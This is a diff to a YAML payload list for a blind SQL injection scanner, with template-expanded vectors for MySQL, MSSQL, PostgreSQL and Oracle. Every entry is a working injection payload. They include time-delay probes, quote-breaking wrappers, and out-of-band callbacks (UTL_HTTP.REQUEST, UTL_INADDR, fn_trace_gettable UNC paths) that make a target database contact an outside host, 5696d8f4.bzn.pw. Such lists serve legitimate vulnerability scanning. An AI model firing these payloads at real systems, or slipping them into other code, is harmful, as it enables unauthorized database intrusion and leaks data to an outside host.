@@ -1,10 +1,11 @@
 mysql_select:
   - BENCHMARK(1000000,MD5('A'))
-  - SLEEP(5)
+  - SLEEP(10)
 mssql_select:
-  - WAITFOR DELAY '00:00:20'
+  - WAITFOR DELAY '00:00:10'
+  - (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))
 postgre_select:
-  - pg_sleep(10)
+  - pg_sleep(10) is not null
 
 simple_select:
   - "%mysql_select;"
@@ -13,22 +14,33 @@ simple_select:
     
 oracle_select:
   - UTL_INADDR.get_host_name('10.0.0.1')
-  - UTL_INADDR.get_host_address('5696d8f4.bzn.pw')
-  - UTL_HTTP.REQUEST('http://5696d8f4.bzn.pw')
+  - UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')
+  - UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')
 
 all_select:
   - "%simple_select;"
   - "%oracle_select;"
 
 stacked:
-  - BEGIN DBMS_LOCK.SLEEP(5); END; 
-  - WAITFOR DELAY '00:00:20'
+  - BEGIN DBMS_LOCK.SLEEP(10); END; 
+  - WAITFOR DELAY '00:00:10'
+  - select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)
 
 select_vectors:
   - "+%all_select;"
   - "+%all_select;%close;"
   - "'+%all_select;+'a"
+  - "')+%all_select;+('a"
   - "'+%all_select;%close;"
+  - "\"+%all_select;+\"a"
+  - "\")+%all_select;+(\"a"
+  - "\"+%all_select;%close;"
+  - "' and %all_select; and '1'='a"
+  - "') and %all_select; and ('1'='a"
+  - "' and %all_select;%close;"
+  - "\" and %all_select; and \"1\"=\"a"
+  - "\") and %all_select; and (\"1\"=\"a"
+  - "\" and %all_select;%close;"  
   - "(%all_select;)"
   - "(%all_select;)%close;"
 
